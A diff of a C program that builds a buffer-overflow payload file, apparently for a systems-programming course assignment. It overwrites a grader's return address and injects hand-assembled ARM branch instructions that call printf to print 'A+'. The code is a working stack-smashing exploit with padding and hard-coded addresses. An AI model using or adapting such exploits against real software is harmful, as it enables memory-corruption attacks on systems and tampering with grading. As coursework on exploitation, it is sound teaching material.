@@ -4,7 +4,7 @@
 int main(void) {
     FILE *dataAplus;
     unsigned int payloadAddress, printfAddress;
-    unsigned int ldrInstr, blInstr;
+    unsigned int ldrInstr, bInstr;
     int i = 0;
 
     /* Open the dataAplus file for writing */
@@ -16,8 +16,8 @@ int main(void) {
 
     /*Addresses need to be adjusted based on actual memory layout */
     printfAddress = 0x400690; 
-    payloadAddress = 0x420044; 
 
+    payloadAddress = MiniAssembler_adr(0, 0x420044, 0x420064); 
     /*Overwrite the return address with our payload address*/
     fwrite(&payloadAddress, sizeof(payloadAddress), 1, dataAplus);
 
@@ -26,20 +26,17 @@ int main(void) {
     fwrite(&ldrInstr, sizeof(ldrInstr), 1, dataAplus);
 
     /* Branch to printf with "A+" string */
-    blInstr = MiniAssembler_bl(printfAddress, payloadAddress);
-    fwrite(&blInstr, sizeof(blInstr), 1, dataAplus);
+    bInstr = MiniAssembler_b(printfAddress, payloadAddress);
+    fwrite(&bInstr, sizeof(bInstr), 1, dataAplus);
 
-    /*Branch back to a safe point in the grader after printf*/
-    blInstr = MiniAssembler_bl(0x40089c, payloadAddress + 8);
-    fwrite(&blInstr, sizeof(blInstr), 1, dataAplus);
+    /* Branch back to main function after getName */
+    bInstr = MiniAssembler_b(0x40089c, 0x420070);
+    fwrite(&bInstr, sizeof(unsigned int), 1, dataAplus);
     
-    /*Padding to fill buffer and reach the return address*/
-    while(i < 20) {
-        putc('A', dataAplus);
-        i++;
-    }
+    /* add padding to overrun the stack */
+    fprintf(dataAplus, "%s", "anganganganganganggg"); /* 20 characters */
 
-    /* write BSS address of ldr instruction to file */
+    /* write BSS address of adr instruction to file */
     fprintf(dataAplus, "%c", 0x64);
     fprintf(dataAplus, "%c", 0x00);
     fprintf(dataAplus, "%c", 0x42);
